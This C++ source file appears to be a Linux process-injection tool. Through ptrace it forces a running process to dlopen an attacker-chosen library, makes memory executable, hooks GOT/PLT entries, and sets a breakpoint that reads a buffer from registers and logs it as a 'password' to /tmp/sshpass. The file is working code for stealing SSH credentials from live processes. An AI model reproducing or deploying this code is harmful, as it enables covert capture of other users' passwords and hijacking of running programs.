#include "./ptraceAPI.h"
#include <elf.h>

#include <iostream>
#include <wait.h>
#include <dlfcn.h>
#include <signal.h>
#include <fstream>

#ifndef LIBCNAME
#define LIBCNAME "libc-2.30.so"
#endif
#ifndef PASSWDPATH
#define PASSWDPATH "/tmp/sshpass"
#endif

using std::ofstream;
void load_so(pid_t pid, void * dlopen, const char * soPath)
{/*{{{*/
	regs reg_orig, reg;
	fpregs fpreg_orig, fpreg;
	char * buffer;
	int length  = strlen(soPath);
	int stacksize = length+0x10;
	uint64_t ret = 0xdeadbeefcafebabe;
	int status;
#ifdef DEBUG
	ofstream f("/tmp/log");
#endif
	char *namebuf = new char[length+1];
	memcpy(namebuf, soPath, length);
	ptrace_attach(pid, 1);
	buffer = (char *)malloc(stacksize);
	usleep(100);
	ptrace_getregs(pid, &reg_orig, &fpreg_orig);
	memcpy(&reg, &reg_orig, sizeof(reg));
	procread(pid, buffer, (void *)reg.rsp, stacksize);
	procwrite(pid, &ret, (void* )reg.rsp, sizeof(ret));
	procwrite(pid, namebuf, (void*)(reg.rsp+ sizeof(ret)),length+1 );
	usleep(100);
	reg.rdi= reg.rsp+sizeof(ret);
	reg.rsi= RTLD_NOW|RTLD_GLOBAL|RTLD_NODELETE;
	reg.rip= (uint64_t)dlopen+2;
	ptrace_setregs(pid, &reg, 0);

	if(ptrace(PTRACE_CONT, pid, NULL, NULL) == -1)
	{
		puts("error Continue");
#ifdef DEBUG
		f << "error Continue"<<std::endl;
		f.close();
#endif
		exit(1);
	}
	waitpid(pid, &status, 0);
	ptrace_getregs(pid, &reg, 0);
	std::cout << "dlopen addr:"<<std::hex<<dlopen;
#ifdef DEBUG
	f<< "loading : " <<namebuf <<std::endl;
	f << "dlopen addr:"<<std::hex<<dlopen;
	f<< " finish addr:"<< std::hex<< reg.rip<< std::endl;
#endif
	std::cout << " finish addr:"<< std::hex<< reg.rip<< std::endl;
	
	procwrite(pid, buffer, (void *)reg_orig.rsp, stacksize);
	ptrace_setregs(pid, &reg_orig, &fpreg_orig);
	free(buffer);
	ptrace_attach(pid,0);
	return;
}/*}}}*/

#include <sys/mman.h>
void change_protect(pid_t pid, void * mprotect, void * addr, int length)
{/*{{{*/
	char buf [64];
	uint64_t ret = 0xdeadbeefcafebabe;
	int status;
#ifdef DEBUG
	ofstream f;	
	f.open("/tmp/reglog");	
#endif
	regs reg_orig, reg;
	fpregs fpreg_orig, fpreg;

//	kill(getpid(),SIGSTOP);

	ptrace(PTRACE_SEIZE, pid, 0, 0);
	ptrace(PTRACE_INTERRUPT,pid,0,0);
	waitpid(pid, &status, 0);
	ptrace_getregs(pid, &reg_orig, &fpreg_orig);
	ptrace(PTRACE_CONT,pid,0,0);
	memcpy(&reg, &reg_orig, sizeof(reg));
	reg.rdi= (uint64_t)addr;
	reg.rsi= length; 
	reg.rdx= PROT_WRITE | PROT_READ|PROT_EXEC;
	reg.rip= (uint64_t)mprotect+3;

	ptrace(PTRACE_SEIZE, pid, 0, 0);
	ptrace(PTRACE_INTERRUPT,pid,0,0);
	waitpid(pid, &status, 0);
	procread(pid, buf, (void *)reg.rsp, 0x40);
	procwrite(pid, &ret, (void* )reg.rsp, sizeof(ret));
	ptrace_setregs(pid, &reg, 0);
	kill(pid, SIGSTOP);
	ptrace(PTRACE_DETACH, pid, 0, 0);
	//ptrace(PTRACE_CONT,pid,0,0);
	waitpid(pid, &status, 0);

	ptrace_getregs(pid,&reg,0);

#ifdef DEBUG
	f << "start :" << mprotect << " end: "<<std::hex<< reg.rip << std::endl;
	f.close();
#endif
	procwrite(pid, buf, (void *)reg_orig.rsp, 0x40);
	ptrace_setregs(pid, &reg_orig, &fpreg_orig);
	ptrace(PTRACE_CONT,pid,0,0);
	return;
}/*}}}*/

void breakpoint(pid_t pid , void * ptr)
{/*{{{*/
	char buf;
	int state=0;
	regs  reg;
	ofstream fs;
	char sec [1024];
	memset(sec,0,1024);
	fs.open(PASSWDPATH,std::ios_base::app);
	procread(pid, &buf, ptr, 1);
#ifdef DEBUG
	fs <<"break at: "<<ptr <<std::endl;
#endif
	ptrace(PTRACE_SEIZE,pid,0, 0);
	ptrace(PTRACE_INTERRUPT,pid ,0,0);
	procwrite(pid, "\xcc", ptr, 1);
	ptrace(PTRACE_CONT,pid ,0,0);
	

	while(1)
	{
	struct timespec tim,tim2;
	tim.tv_sec  = 0;
	tim.tv_nsec = 200000000L;
	waitpid(pid,&state,0);
	nanosleep(&tim, &tim2);
	ptrace_getregs(pid, &reg,0);
#ifdef DEBUG
	fs<<"stop at: "<<std::hex <<reg.rip <<std::endl;
	if(WIFEXITED(state))
		fs<<"sigt: EXITED"<<std::endl;
	if(WIFSIGNALED(state))
		fs << "sig: "<<WTERMSIG(state)<<std::endl;		
	if(WCOREDUMP(state))
		fs << "sig: CoreDump"<<std::endl;
	if(WIFSTOPPED(state))
		fs <<"sig: "<< WSTOPSIG(state) <<std::endl;
#endif
        if((reg.rip &0xfffffffffffff000) == (((uint64_t)ptr)&0xfffffffffffff000))
		break;
//	reg.rip+=1;
//	ptrace_setregs(pid, &reg, 0);
	ptrace(PTRACE_CONT,pid,0,0);
	}
//	waitpid(pid, &state, 0);	

	procwrite(pid, &buf, ptr,1);
	ptrace_getregs(pid, &reg,0);
#ifdef DEBUG
	fs << "rip: "<< std::hex <<reg.rip<<std::endl;
#endif
	reg.rip-=1;
	ptrace_setregs(pid, &reg,0);
	procread(pid,sec, (void*)reg.rsi, reg.rdx);



	
	ptrace(PTRACE_CONT, pid, 0, 0);
      	ptrace(PTRACE_DETACH, pid, 0, 0);
#ifdef DEBUG
	fs << "rdi: "<< std::hex <<reg.rdi<<std::endl;
	fs << "rsi: "<< std::hex <<reg.rsi<<std::endl;
	fs << "rdx: "<< std::hex <<reg.rdx<<std::endl;
	fs << "rip: "<< std::hex <<reg.rip<<std::endl;
#endif
	fs << "password: "<< sec<<std::endl;
	fs.close();
	return;

}/*}}}*/

void *procfind( pid_t pid, const unsigned char * pattern,int pat_len, void * start, void *end)
{/*{{{*/
	int64_t length;
	unsigned char * buf;
	int i,j;
	length= ((char *)end)-((char *)start);
	buf = new unsigned char[length];
	memset(buf, 0, length);
	ptrace(PTRACE_SEIZE, pid, 0, 0);
	ptrace(PTRACE_INTERRUPT, pid, 0, 0);
	procread(pid, buf, start, length);
	ptrace(PTRACE_CONT, pid, 0, 0);
	ptrace(PTRACE_DETACH, pid, 0, 0);
	for( i=0; i< length; ++i)
	{
		if(buf[i] !=pattern[0])
		{
			continue;
		}
			
		for(j=i;j < i+pat_len; ++j)
		{
			if(buf[j]!=pattern[j-i])
				break;
		}
		if(j-i==pat_len)
			break;
	}
	if(i==length)
		return (void *)0;
	return (void*)((char*)start+i);

}/*}}}*/

#define EHDR Elf64_Ehdr
#define PHDR Elf64_Phdr
#define DYN Elf64_Dyn
#define SYM Elf64_Sym
#define addr_t void *
#define addr(a,b) (void *)((char *)a+b)
//Set G_gotplt
void * find_symbol(pid_t pid , const char * SymName, const char * LibName)
{/*{{{*/
	EHDR ehdr;
	PHDR * phdr;
	DYN  * dyn_ent;
	SYM  * sym_ent;
	addr_t dyn_section;
	addr_t sym_section;
	addr_t str_section;
	uint64_t phsize;
	uint64_t dyn_size;
	uint64_t sym_cnt;
	uint64_t str_size;
	char * buffer;

	//parse EHDR and PHDR
	void * ehdrp= (void *)getlibAddr(pid, LibName);
	if(ehdrp == 0)
	{
		std::cout <<"Error Find Lib :" << LibName<<"\n";
		return addr(0,0);
	}
		
	procread(pid, &ehdr, ehdrp, sizeof(ehdr));
	phdr= (PHDR *)(ehdr.e_phoff+(char *)ehdrp);
	phsize= ehdr.e_phentsize* ehdr.e_phnum;
	buffer= new char[phsize];
	procread(pid, buffer, phdr, phsize);	
	for(int i=0; i< ehdr.e_phnum; ++i )
	{
		phdr= (PHDR *)(buffer+i*ehdr.e_phentsize);
		if(phdr->p_type == PT_DYNAMIC)
			break;
	}
	dyn_section = (addr_t) addr(ehdrp,phdr->p_vaddr);
	dyn_size = (uint64_t) phdr->p_memsz;
	delete [] buffer;
	//parse .DYNAMIC seg
	buffer = new char[dyn_size];
	int && dyncnt= dyn_size/sizeof(DYN);
	procread(pid , buffer, dyn_section, dyn_size);
	for(int i=0; i< dyncnt; ++i)
	{
		dyn_ent= (DYN *)(buffer+ i* sizeof(DYN));
		if(dyn_ent->d_tag == DT_STRTAB)
			str_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_SYMTAB)
			sym_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_STRSZ)
			str_size= (uint64_t) dyn_ent->d_un.d_val;

	}	
	delete [] buffer;
	// parse .dynsym
	buffer = new char[0x10000];
	sym_cnt= 0x10000/0x18;
	procread(pid, buffer, sym_section, 0x10000);
	int len = strlen(SymName);
	char * buf = new char[len+1];
	int i;
	for(i=0; i< sym_cnt; ++i)
	{
		memset(buf, 0, len+1);
		sym_ent= (SYM*)(buffer+ i*sizeof(SYM));
		void * ptr = addr(str_section,sym_ent->st_name);
		procread(pid, buf, ptr, len);
		if(!strncmp(SymName, buf, len))
			break;
	}
	if(i== sym_cnt)
		return addr(0,0);
	return addr(ehdrp,sym_ent->st_value);
}/*}}}*/

void * GOTPLT;
void gothook(pid_t pid, const char * funcorig, const char * funchook, const char * LibName)
{/*{{{*/
	ofstream fs;
	EHDR ehdr;
	PHDR * phdr;
	DYN  * dyn_ent;
	SYM  * sym_ent;
	addr_t dyn_section;
	addr_t sym_section;
	addr_t str_section;
	addr_t jmprela_section;
	addr_t rela_section;
	addr_t target; // the hook gotplt entry
	uint64_t phsize;
	uint64_t dyn_size;
	uint64_t sym_cnt;
	uint64_t str_size;
	uint64_t rela_sz;
	uint64_t relaentsz;
	char * buffer;
	char * namebuf;
	//parse EHDR and PHDR
	int origlen = strlen(funcorig)+1;
	namebuf = new char[origlen];
	memset(namebuf, 0, origlen);
	
#ifdef DEBUG
	fs.open("/tmp/gothook");
	fs << "hook pid: "<<pid<<std::endl;
	fs <<"Funcorig: "<<funcorig<<std::endl;
	fs <<"Funchook: "<<funchook<<std::endl;
	fs <<"Libname from: "<<LibName<<std::endl;
#endif
	void * ehdrp= (void *)getLoadAddr(pid);
	procread(pid, &ehdr, ehdrp, sizeof(ehdr));
	phdr= (PHDR *)(ehdr.e_phoff+(char *)ehdrp);
	phsize= ehdr.e_phentsize* ehdr.e_phnum;
	buffer= new char[phsize];
	procread(pid, buffer, phdr, phsize);	
	for(int i=0; i< ehdr.e_phnum; ++i )
	{
		phdr= (PHDR *)(buffer+i*ehdr.e_phentsize);
		if(phdr->p_type == PT_DYNAMIC)
			break;
	}
	dyn_section = (addr_t) addr(ehdrp,phdr->p_vaddr);
	dyn_size = (uint64_t) phdr->p_memsz;
	delete [] buffer;
	//parse .DYNAMIC seg
	buffer = new char[dyn_size];
	int && dyncnt= dyn_size/sizeof(DYN);
	procread(pid , buffer, dyn_section, dyn_size);
	for(int i=0; i< dyncnt; ++i)
	{
		dyn_ent= (DYN *)(buffer+ i* sizeof(DYN));
		if(dyn_ent->d_tag == DT_PLTGOT)
			GOTPLT= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_RELA)
			rela_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_JMPREL)
			jmprela_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag ==DT_RELSZ)
			rela_sz = dyn_ent->d_un.d_ptr;
		else if(dyn_ent->d_tag == DT_RELENT)
			relaentsz= dyn_ent->d_un.d_ptr;
		else if(dyn_ent->d_tag == DT_STRTAB)
			str_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_SYMTAB)
			sym_section= addr(dyn_ent->d_un.d_ptr,0);
		else if(dyn_ent->d_tag == DT_STRSZ)
			str_size= (uint64_t) dyn_ent->d_un.d_val;

	}	
	delete [] buffer;
	//parse rela
	buffer = new char[0x10000];
	relaentsz=0x18;
	procread(pid, buffer, rela_section, 0x10000);
	Elf64_Rela *rela_ent;
	for(int i=0;i < 0x10000/relaentsz; ++i)
	{
		uint32_t symidx;
		uint32_t strpos;
		rela_ent= (Elf64_Rela *)(buffer+i*relaentsz);
		if(ELF64_R_TYPE(rela_ent->r_info) == R_X86_64_JUMP_SLOT)
		{
			symidx= ELF64_R_SYM(rela_ent->r_info);
			strpos =0;
			procread(pid, &strpos, addr(sym_section,symidx*0x18), 4);
			procread(pid, namebuf, addr(str_section,strpos), origlen);
			if(!strncmp(namebuf, funcorig, origlen-1))
				break;
		}
		else if(ELF64_R_TYPE(rela_ent->r_info) ==R_X86_64_GLOB_DAT )
		{
			symidx = ELF64_R_SYM(rela_ent->r_info);
			strpos =0;
			procread(pid, &strpos, addr(sym_section,symidx*0x18), 4);
			procread(pid, namebuf, addr(str_section,strpos), origlen);
			if(!strncmp(namebuf, funcorig, origlen-1))
				break;
		}

	}
	target = addr(ehdrp,rela_ent->r_offset);
	//Hooking
	void *pfunchook=0;
	pfunchook= find_symbol(pid, funchook, LibName);
#ifdef DEBUG
	fs.close();
#endif
	if(pfunchook == 0)
		std::cout <<"Error find symbol: "<< funchook <<" in: "<<LibName<<std::endl;
	std::cout << "Overwrite rela(addr): "<<std::hex <<target <<" (data):"<<pfunchook<<std::endl;
	procwrite(pid, &pfunchook, target, sizeof(pfunchook));
	delete []buffer;
	delete []namebuf;
	return ;
}/*}}}*/

